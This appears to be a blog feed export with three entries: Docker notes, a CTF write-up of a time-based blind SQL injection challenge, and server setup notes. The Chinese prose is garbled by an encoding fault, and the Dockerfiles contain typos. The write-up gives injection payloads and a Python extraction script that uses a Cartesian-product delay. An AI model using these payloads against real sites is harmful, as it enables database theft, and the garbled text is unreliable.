#ç±»ä¼¼ADDï¼Œå°†æ–‡ä»¶æ‹·è´åˆ°é•œåƒä¸­</span><br><span class="line">ENV              #æ„å»ºçš„æ—¶å€™è®¾ç½®ç¯å¢ƒå˜é‡</span><br></pre></td></tr></table></figure><h5 id="å®æˆ˜æµ‹è¯•1"><a href="#å®æˆ˜æµ‹è¯•1" class="headerlink" title="å®æˆ˜æµ‹è¯•1"></a>å®æˆ˜æµ‹è¯•1</h5><hr><p>Docker HUbä¸­99%çš„é•œåƒéƒ½æ˜¯ä»ä¸€ä¸ªåŸºç¡€é•œåƒè¿‡æ¥çš„ã€‚<code>FROM scratch</code>ï¼Œç„¶åè®¾ç½®éœ€è¦çš„è½¯ä»¶å’Œå…¶ä»–çš„é…ç½®ã€‚</p><p>åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„centosï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Dockerfile</span><br><span class="line">FROM cnetos</span><br><span class="line">MAINTAINER psych&lt;1836969156@qq.com&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD ehco $MYPATH</span><br><span class="line">CMD echo &#x27;---end---&#x27;</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -f /pathÂ·Â· -t mycentos:0.1 .</span><br><span class="line">#docker build -f dockerfileæ–‡ä»¶è·¯å¾„ -t é•œåƒå:[tag]</span><br></pre></td></tr></table></figure><p><strong>å¯ä»¥é€šè¿‡<code>docker history é•œåƒID</code> æŸ¥çœ‹é•œåƒæ„å»ºè¿‡ç¨‹(å˜æ›´å†å²)</strong></p><h5 id="å®æˆ˜æµ‹è¯•2"><a href="#å®æˆ˜æµ‹è¯•2" class="headerlink" title="å®æˆ˜æµ‹è¯•2"></a>å®æˆ˜æµ‹è¯•2</h5><hr><p>æ„å»ºTomcaté•œåƒï¼š</p><ul><li>å‡†å¤‡é•œåƒæ–‡ä»¶ï¼šTomcatå‹ç¼©åŒ…ï¼Œjdkå‹ç¼©åŒ…</li><li>ç¼–å†™Dockerfileæ–‡ä»¶</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#Dockerfile</span><br><span class="line">FROM centos</span><br><span class="line">MAINTAINER psych&lt;1836969156@qq.com&gt;</span><br><span class="line"></span><br><span class="line">COPY readme.txt /usr/local/readme.txt</span><br><span class="line"></span><br><span class="line">ADD jdk-8ull-linux-x86.tar.gz /usr/local              #ADDä¹‹åä¼šè‡ªåŠ¨è§£å‹</span><br><span class="line">ADD apache-tomcat-9.0.22.tar.gz /usr/local</span><br><span class="line"></span><br><span class="line">RUN uym -y install vim</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line"></span><br><span class="line">ENV JAVA_HOME /usr/local/jdk.8.0_11</span><br><span class="line">ENV CLASSPATH $JAVA_HOME/lib/dj.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line">ENV CATALINE_HOME /usr/local/apache-tomcat-9.0.22</span><br><span class="line">ENV CATALINA_BASE /usr/local/apache-tomcat-9.0.22</span><br><span class="line">ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin</span><br><span class="line"></span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.22/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.22/bin/logs/catalina.out</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#æ„å»ºé•œåƒ</span><br><span class="line">docker build -t name .</span><br><span class="line">#å¯åŠ¨é•œåƒ</span><br><span class="line">docker run -d -p 8888:8080 --name psychtomcat -v /home/psych/build/tomcat/test:/usr/local/apache-tomcat-9.0.22/webapps/test å®¹å™¨name</span><br><span class="line">#è¿›å…¥å®¹å™¨</span><br><span class="line">docker exec -it å®¹å™¨ID /bin/bash</span><br></pre></td></tr></table></figure><h3 id="Dockerç½‘ç»œ"><a href="#Dockerç½‘ç»œ" class="headerlink" title="Dockerç½‘ç»œ"></a>Dockerç½‘ç»œ</h3><hr><h5 id="Docker0"><a href="#Docker0" class="headerlink" title="Docker0"></a>Docker0</h5><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip addr           #æŸ¥çœ‹ipåœ°å€</span><br><span class="line">å‡ºç°ä¸‰ä¸ªåœ°å€</span><br><span class="line">l0:  127.0.0.1                 #æœ¬æœºå›ç¯åœ°å€</span><br><span class="line">eth0:  172.17.90.138           #æœåŠ¡å™¨å…¬ç½‘åœ°å€</span><br><span class="line">docker0:  172.18.0.1/16        #Dockerå¸®æˆ‘ä»¬ç”Ÿæˆçš„ç½‘å¡åœ°å€</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#é—®é¢˜ï¼šdockeræ˜¯å¦‚ä½•å¤„ç†ç½‘ç»œè®¿é—®çš„ï¼Ÿ</span><br><span class="line"></span><br><span class="line">#æˆ‘ä»¬éšä¾¿å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼ŒæŸ¥çœ‹å…¶ipåœ°å€ï¼Œå¹¶å°è¯•ä¸»æœºpingä¸€ä¸‹</span><br><span class="line">docker run -d -P tomcat</span><br><span class="line">docker exec -it tomcat ip addr    #ä¸è¿›å…¥å®¹å™¨ï¼Œç›´æ¥æ‰§è¡Œå‘½ä»¤</span><br><span class="line">#å‘ç°äº†ä¸¤ä¸ªç½‘å¡:</span><br><span class="line">l0:           127.0.0.1/8</span><br><span class="line">eth0@if162:   172.18.0.2/16      #dockeråˆ†é…çš„ã€‚</span><br><span class="line">#ä¸»æœºå°è¯•ping</span><br><span class="line">ping 172.18.0.2       #å‘ç°ä¸»æœºå¯ä»¥pingé€šdockerå®¹å™¨å†…éƒ¨</span><br></pre></td></tr></table></figure><blockquote><p>åŸç†</p></blockquote><ul><li>æˆ‘ä»¬æ¯å¯åŠ¨ä¸€ä¸ªdockerå®¹å™¨ï¼Œdockerå°±ä¼šç»™å®¹å™¨åˆ†é…ä¸€ä¸ªipï¼Œæˆ‘ä»¬åªè¦å®‰è£…äº†dockerï¼Œå°±ä¼šæœ‰ä¸€ä¸ªç½‘å¡docker0ï¼Œæ¡¥æ¥æ¨¡å¼ï¼Œä½¿ç”¨çš„æŠ€æœ¯æ˜¯veth-pairæŠ€æœ¯</li><li>å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œä¸»æœºip addrå°±ä¼šå¤šä¸€å¯¹ç½‘å¡ã€‚veth-pairå°±æ˜¯ä¸€å¯¹çš„è™šæ‹Ÿè®¾å¤‡æ¥å£ï¼Œéƒ½æ˜¯æˆå¯¹å‡ºç°ï¼Œä¸€ç«¯è¿ç€åè®®ï¼Œå¦ä¸€ç«¯å½¼æ­¤ç›¸è¿</li><li>ä¸åŒçš„å®¹å™¨å’Œå®¹å™¨ä¹‹é—´ä¹Ÿæ˜¯å¯ä»¥äº’ç›¸pingé€šçš„ï¼Œå› ä¸ºdocker0å°±æƒ³ä¸€ä¸ªè·¯ç”±å™¨ä¸€æ ·ï¼Œè®©å„ä¸ªå®¹å™¨ä¹‹é—´èƒ½å¤Ÿping</li><li>dockerä¸­æ‰€æœ‰çš„ç½‘ç»œæ¥å£éƒ½æ˜¯è™šæ‹Ÿçš„ï¼Œè™šæ‹Ÿçš„è½¬å‘æ•ˆç‡é«˜ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> webåŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> webåŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·…å³°æå®¢2023-web-hellosql-wp</title>
      <link href="/2023/07/24/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023-web-hellosql-wp/"/>
      <url>/2023/07/24/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023-web-hellosql-wp/</url>
      
        <content type="html"><![CDATA[<h4 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h4><p>è¿™ä¸ªé¢˜æœ¬æ¥è¶…çº§ç®€å•è€Œä¸”è‡ªå·±éƒ½å·²ç»æœ‰æ€è·¯å°±æ˜¯æ—¶é—´ç›²æ³¨äº†ï¼Œæœ¬æ¥æƒ³ç¡ä¸€è§‰å°±èµ·åºŠåšï¼Œç»“æœæˆåŠŸç¡åˆ°æ¯”èµ›ç»“æŸã€‚ã€‚çœŸçš„å¯¹ä¸èµ·é˜Ÿå‹å•Šï¼ï¼ï¼</p><h4 id="hellosql"><a href="#hellosql" class="headerlink" title="hellosql"></a>hellosql</h4><p>è¿›å…¥ä¹‹åæ³¨å…¥ç‚¹å¾ˆæ˜æ˜¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â xxx.xxx.xxx.xxx:xxxx/index.php?id=1</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹idåé¢çš„å€¼ï¼Œå›æ˜¾ä¸€ç›´ä¸å˜ï¼Œè€Œä¸”æ˜æ˜¾æ²¡æœ‰æ˜¾ç¤ºæ•°æ®çš„åœ°æ–¹ï¼Œæ˜¾ç„¶åªèƒ½æ˜¯ç›²æ³¨æˆ–è€…æŠ¥é”™æ³¨å…¥ã€‚</p><p>SQLæ³¨å…¥çš„é¢˜é¦–å…ˆæ‹¿å»fuzzä¸€æ³¢ï¼Œå‘ç°æ²¡åšä»€ä¹ˆè¿‡æ»¤ã€‚ä½†æ˜¯å¯ç–‘çš„æ˜¯sleep()å’Œbenchmark()è¢«è¿‡æ»¤äº†ï¼Œå·²ç»åœ¨æš—ç¤ºè¿™æ˜¯æ—¶é—´ç›²æ³¨äº†ã€‚ã€‚</p><p>å¸¸è§çš„ä¸¤ä¸ªå‡½æ•°è¢«è¿‡æ»¤ï¼Œäºæ˜¯è€ƒè™‘ä½¿ç”¨<strong>ç¬›å¡å°”ç§¯</strong>ã€‚</p><p>ä½¿ç”¨å•å¼•å·å’Œ#è¿›è¡Œé—­åˆå’Œæ³¨é‡Šï¼Œå†™å‡ºç›²æ³¨è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â ascii(substr(database(),1,1))&lt;116 and (select sum(0) from information_ schema.columns A, information_ schema.columns B)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â /index.php?id=1%27%20and%20ascii(substr(database(),1,1))&lt;116%%20(select%20sum(0)%20from information_schema.%20A,information_schema.columns%20B)%23</span><br></pre></td></tr></table></figure><p>å†™å‡ºPythonè„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Â import time</span><br><span class="line">Â import requests</span><br><span class="line">Â from datetime import datetime</span><br><span class="line">Â â€‹</span><br><span class="line">Â url = &quot;xxx/index.php&quot;</span><br><span class="line">Â result = &quot;&quot;</span><br><span class="line">Â for i in range(1,100):</span><br><span class="line">Â  Â  Â head = 32</span><br><span class="line">Â  Â  Â tail = 126</span><br><span class="line">Â  Â  Â while head &lt; tail:</span><br><span class="line">Â  Â  Â  Â  Â mid = (head + tail) &gt;&gt; 1</span><br><span class="line">Â  Â  Â  Â  Â #æŸ¥æ•°æ®åº“ ctf</span><br><span class="line">Â  Â  Â  Â  Â param = &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â &quot;id&quot;: f&quot;1&#x27; and ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125; and (select sum(0) from information_schema.columns A,information_schema.columns B)#&quot;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â  Â  Â  Â #æŸ¥è¡¨</span><br><span class="line">Â  Â  Â  Â  Â param = &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â &quot;id&quot;: f&quot;1&#x27; and ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125; and (select sum(0) from information_schema.columns A,information_schema.columns B)#&quot;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â  Â  Â  Â #æŸ¥åˆ—  Flagg</span><br><span class="line">Â  Â  Â  Â  Â param = &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â &quot;id&quot;: f&quot;1&#x27; and ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flllag&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125; and (select sum(0) from information_schema.columns A,information_schema.columns B)#&quot;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â  Â  Â  Â #Flagg æŸ¥æ•°æ®</span><br><span class="line">Â  Â  Â  Â  Â param = &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â &quot;id&quot;: f&quot;1&#x27; and ascii(substr((select(group_concat(concat_ws(0x7e,Flagg)))from(ctf.Flllag)),&#123;i&#125;,1))&gt;&#123;mid&#125; and (select sum(0) from information_schema.columns A,information_schema.columns B)#&quot;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â  Â  Â  Â start = int(datetime.now().timestamp() * 1000)</span><br><span class="line">Â  Â  Â  Â  Â resp = requests.get(url, params=param)</span><br><span class="line">Â  Â  Â  Â  Â # print(resp.text)</span><br><span class="line">Â  Â  Â  Â  Â end = int(datetime.now().timestamp() * 1000)</span><br><span class="line">Â  Â  Â  Â  Â if end - start &gt; 300:</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â head = mid + 1</span><br><span class="line">Â  Â  Â  Â  Â else:</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â tail = mid</span><br><span class="line">Â  Â  Â if head != 32:</span><br><span class="line">Â  Â  Â  Â  Â result += chr(head)</span><br><span class="line">Â  Â  Â else:</span><br><span class="line">Â  Â  Â  Â  Â break</span><br><span class="line">Â  Â  Â print(result)</span><br></pre></td></tr></table></figure><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><ul><li>SQLæ³¨å…¥ç¬¬ä¸€ç‚¹æ˜¯å¯»æ‰¾æ³¨å…¥ç‚¹ï¼Œè¿™ä¸ªé¢˜ç›®æ²¡æœ‰éš¾åº¦</li><li>æ ¹æ®é¢˜ç›®ç¯å¢ƒï¼Œé”å®šæ³¨å…¥æ–¹æ³•ï¼šç›²æ³¨æˆ–è€…æŠ¥é”™æˆ–è€…å†™webshellï¼Œå› ä¸ºå‡ ä¹å¯ä»¥è¯´æ˜¯æ²¡æœ‰å›æ˜¾</li><li>å¼€å§‹fuzzï¼Œå¯»æ‰¾æ€è·¯</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­å»ºåšå®¢</title>
      <link href="/2023/07/13/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/07/13/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>ä½¿ç”¨åä¸ºäº‘</p><h4 id="å…³äºå®‰å…¨ç»„"><a href="#å…³äºå®‰å…¨ç»„" class="headerlink" title="å…³äºå®‰å…¨ç»„"></a>å…³äºå®‰å…¨ç»„</h4><p>å®‰å…¨ç»„æ˜¯ä¸€ç§<strong>è™šæ‹Ÿé˜²ç«å¢™</strong>ï¼Œå…·å¤‡çŠ¶æ€æ£€æµ‹å’ŒåŒ…è¿‡æ»¤åŠŸèƒ½ï¼Œä½ å¯ä»¥ç›´æ¥å°†å…¶ç†è§£ä¸ºé˜²ç«å¢™ã€‚å®‰å…¨ç»„æ˜¯ä¸€ä¸ªé€»è¾‘ä¸Šçš„åˆ†ç»„ï¼Œè¯¥åˆ†ç»„ç”±ä¸€ä¸ªRegionå†…å…·æœ‰ç›¸åŒå®‰å…¨ä¿æŠ¤éœ€æ±‚ï¼Œå¹¶ä¸”äº’ç›¸ä¿¡ä»»çš„å®ä¾‹ç»„æˆã€‚æ¯ä¸ªå®ä¾‹è‡³å°‘å±äºä¸€ä¸ªå®‰å…¨ç»„ï¼Œåœ¨åˆ›å»ºæ—¶éœ€æŒ‡å®šï¼Œä¹Ÿå¯åˆ›å»ºåä¿®æ”¹ã€‚ åœ¨è¯¥å®éªŒä¸­ï¼Œä¸ºäº†ä½¿æˆ‘ä»¬çš„ECSæœåŠ¡èƒ½é¡ºåˆ©å¯¹å¤–æä¾›æœåŠ¡ï¼Œæˆ‘ä»¬å»ºç«‹å®‰å…¨ç»„å¹¶åœ¨åˆ›å»ºECSæ—¶æŒ‡å®šä½¿ç”¨è¯¥å®‰å…¨ç»„è§„åˆ™ã€‚</p><p>å‚è€ƒï¼š <a href="https://blog.csdn.net/qq_38998213/article/details/118526550">https://blog.csdn.net/qq_38998213&#x2F;article&#x2F;details&#x2F;118526550</a></p><h5 id="ç«¯å£"><a href="#ç«¯å£" class="headerlink" title="ç«¯å£"></a>ç«¯å£</h5><p>ç«¯å£åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯TCPç«¯å£ï¼Œä¸€ç§æ˜¯UDPç«¯å£ã€‚è®¡ç®—æœºä¹‹é—´ç›¸äº’é€šä¿¡çš„æ—¶å€™ï¼Œåˆ†ä¸ºä¸¤ç§æ–¹å¼ï¼šä¸€ç§æ˜¯å‘é€ä¿¡æ¯ä»¥åï¼Œå¯ä»¥ç¡®è®¤ä¿¡æ¯æ˜¯å¦åˆ°è¾¾ï¼Œä¹Ÿå°±æ˜¯æœ‰åº”ç­”çš„æ–¹å¼ï¼Œè¿™ç§æ–¹å¼å¤§å¤šé‡‡ç”¨TCPåè®®ï¼›ä¸€ç§æ˜¯å‘é€ä»¥åå°±ä¸ç®¡äº†ï¼Œä¸å»ç¡®è®¤ä¿¡æ¯æ˜¯å¦åˆ°è¾¾ï¼Œè¿™ç§æ–¹å¼å¤§å¤šé‡‡ç”¨UDPåè®®ã€‚å¯¹åº”è¿™ä¸¤ç§åè®®çš„æœåŠ¡æä¾›çš„ç«¯å£ï¼Œä¹Ÿå°±åˆ†ä¸ºTCPç«¯å£å’ŒUDPç«¯å£ã€‚</p><p>ç«¯å£çš„åˆ†ç±»ï¼š</p><ul><li>å…¬è®¤ç«¯å£(Well-KnownPorts): 0-1023 å®ƒä»¬ç´§å¯†ç»‘å®šï¼ˆbindingï¼‰äºä¸€äº›æœåŠ¡</li><li>åŠ¨æ€ç«¯å£(Dynamic Ports): 1024-65535 ä¸å›ºå®šåˆ†é…æŸç§æœåŠ¡,å½“è¿›ç¨‹å…³é—­æ—¶ï¼Œå°±é‡Šæ”¾æ‰€å ç”¨ç«¯å£</li></ul><h5 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h5><p>åŠŸèƒ½å’Œä½œç”¨ï¼š</p><ul><li>è®¾ç½®å†…ç½‘å’Œå¤–ç½‘</li><li>æ§åˆ¶ç«¯å£çš„å¼€æ”¾</li><li>æ§åˆ¶ç«¯å£çš„å•ç‹¬è¿›æˆ–è€…å‡ºæ•°æ®</li><li>ipè¿‡æ»¤ï¼Œæ§åˆ¶å“ªäº›ipå¯ä»¥è®¿é—®</li><li>æ§åˆ¶è®¿é—®çš„é¢‘ç‡å’Œæ—¶é—´æ®µ</li><li>æ§åˆ¶è®¿é—®è€…çš„ä¸Šä¼ æˆ–è€…ä¸‹è½½æµé‡</li></ul><h3 id="sshç™»å½•æœåŠ¡å™¨"><a href="#sshç™»å½•æœåŠ¡å™¨" class="headerlink" title="sshç™»å½•æœåŠ¡å™¨"></a>sshç™»å½•æœåŠ¡å™¨</h3><p>ç›´æ¥åœ¨cmdæˆ–è€…xshellä¸­è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â ssh root@å…¬ç½‘ip Â  Â   //rootæŒ‡ä»£çš„æ˜¯usernameï¼Œä¸€èˆ¬é»˜è®¤è®¾ç½®ä¸ºroot</span><br></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥å¯†ç å°±å¯ä»¥ç™»å½•</p><h3 id="é…ç½®LAMP"><a href="#é…ç½®LAMP" class="headerlink" title="é…ç½®LAMP"></a>é…ç½®LAMP</h3><p>Debianç³»ç»Ÿæ²¡æœ‰å®‰è£…sudoï¼Œæ‰€ä»¥è¿˜è¦å…ˆå®‰è£…ä¸€ä¸‹sudo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â apt-get install sudo</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆä¹‹åé…ç½®</p><h4 id="é…ç½®PHP"><a href="#é…ç½®PHP" class="headerlink" title="é…ç½®PHP"></a>é…ç½®PHP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â sudo apt update</span><br><span class="line">Â sudo apt install php libapache2-mod-php php-mysql</span><br></pre></td></tr></table></figure><h4 id="å®‰è£…apache"><a href="#å®‰è£…apache" class="headerlink" title="å®‰è£…apache"></a>å®‰è£…apache</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â sudo apt update</span><br><span class="line">Â sudo apt install apache2</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆä¹‹åç”¨å¦‚ä¸‹å‘½ä»¤æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â sudo systemctl status apache2</span><br></pre></td></tr></table></figure><p>å¦‚æœDebian 10ä¸Šé»˜è®¤ufwå¼€å¯äº†é˜²ç«å¢™ï¼Œä½ éœ€è¦å°†HTTP (<code>80</code>) å’Œ HTTPS (<code>443</code>)ç«¯å£æ”¾å¼€ï¼Œä»¥ä¾¿å¤–éƒ¨èƒ½è®¿é—®apacheçš„webæœåŠ¡ã€‚</p><p>å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤é…ç½®é˜²ç«å¢™å…è®¸ApacheæœåŠ¡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â apt-get install ufw Â  Â  //å…ˆä¸‹è½½ufw</span><br><span class="line">Â sudo ufw allow &#x27;Apache Full&#x27; Â  Â  //å†é…ç½®é˜²ç«å¢™ Â  æˆ‘å¤±è´¥äº†ï¼Œä½†åº”è¯¥å¯ä»¥å¼„</span><br></pre></td></tr></table></figure><p>æµè§ˆå™¨ç™»å½•æŸ¥çœ‹æ˜¯å¦é…ç½®æˆåŠŸ</p><p><img src="http://psych.green/wp-content/uploads/2023/07/image-20230713081329988.png"></p><p>å†éšä¾¿å†™ä¸€ä¸ªPHPæ–‡ä»¶æµ‹è¯•ä¸€ä¸‹PHPé…ç½®èµ·æ²¡æœ‰</p><h4 id="ç®—äº†ï¼Œç”¨å®å¡”é¢æ¿"><a href="#ç®—äº†ï¼Œç”¨å®å¡”é¢æ¿" class="headerlink" title="ç®—äº†ï¼Œç”¨å®å¡”é¢æ¿"></a>ç®—äº†ï¼Œç”¨å®å¡”é¢æ¿</h4><p>Debiané»˜è®¤æ²¡æœ‰yumå‘½ä»¤ï¼Œè¾“å…¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â wget -O install.sh http://download.bt.cn/install/install-ubuntu.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><p>ä¸‹è½½å®å¡”é¢æ¿ï¼Œè®°å¾—å¦‚æœç«¯å£é™åˆ¶äº†å°±åœ¨åä¸ºäº‘æ§åˆ¶å°å®‰å…¨ç»„è®¾ç½®ä¸€ä¸‹</p><p>è¿›å…¥é¢æ¿ä¸€é”®å®‰è£…lamp</p><h3 id="å®‰è£…WordPress"><a href="#å®‰è£…WordPress" class="headerlink" title="å®‰è£…WordPress"></a>å®‰è£…WordPress</h3><p>åœ¨å®å¡”ä¸Šä¸€é”®å®‰è£…ï¼Œå‚»ç“œå¼éƒ¨ç½²ã€‚ã€‚</p><h3 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h3><p>åŠ äº†åŸŸåä¹‹åå°±æ‰“ä¸å¼€WordPressäº†ï¼Œä¹‹å‰æ˜¯WordPressçš„åšå®¢æ‰“ä¸å¼€ç°åœ¨æ˜¯å‡ºäº†å®å¡”çš„ç«¯å£å¼€ç€å…¶ä»–ç«¯å£éƒ½ä¸èƒ½è®¿é—®ã€‚åˆæ­¥æ€€ç–‘é—®é¢˜æœ‰ä¼ªé™æ€ï¼ŒåŸŸåè§£æï¼Œç«¯å£å·ï¼ŒPHPé…ç½®</p><h4 id="åŸŸåè§£æ"><a href="#åŸŸåè§£æ" class="headerlink" title="åŸŸåè§£æ"></a>åŸŸåè§£æ</h4><p>åŸŸåè§£æéœ€è¦åœ¨è´­ä¹°åŸŸåçš„æ§åˆ¶å°ä¸Šï¼Œæ·»åŠ è§£æï¼Œæ³¨æ„wwwå’Œä¸åŠ www çš„éƒ½è¦æ·»åŠ å¤‡æ¡ˆ</p><p>è‡³äºdnsè§£æï¼Œä¼°è®¡å°±æ˜¯åŸŸåè§£æçš„ç¨³å®šæ€§æˆ–è€…æ•ˆç‡ä¹‹ç±»çš„</p><p>ç„¶åå†äº‘æœåŠ¡å™¨çš„æ§åˆ¶å°ä¹Ÿéœ€è¦æ·»åŠ åŸŸåï¼Œå®å¡”å»ºç«™çš„æ—¶å€™ä¹Ÿéœ€è¦å°†ä¸¤ä¸ªåŸŸåéƒ½æ·»åŠ ä¸Šå¦åˆ™ä¼šæ²¡æ³•è·³è½¬è€Œå¯¼è‡´404ã€‚ã€‚</p><h4 id="ä¼ªé™æ€"><a href="#ä¼ªé™æ€" class="headerlink" title="ä¼ªé™æ€"></a>ä¼ªé™æ€</h4><p>å®å¡”ä¸Šé¢å¾ˆå¥½è®¾ç½®ä¼ªé™æ€ï¼Œç›´æ¥åŠ 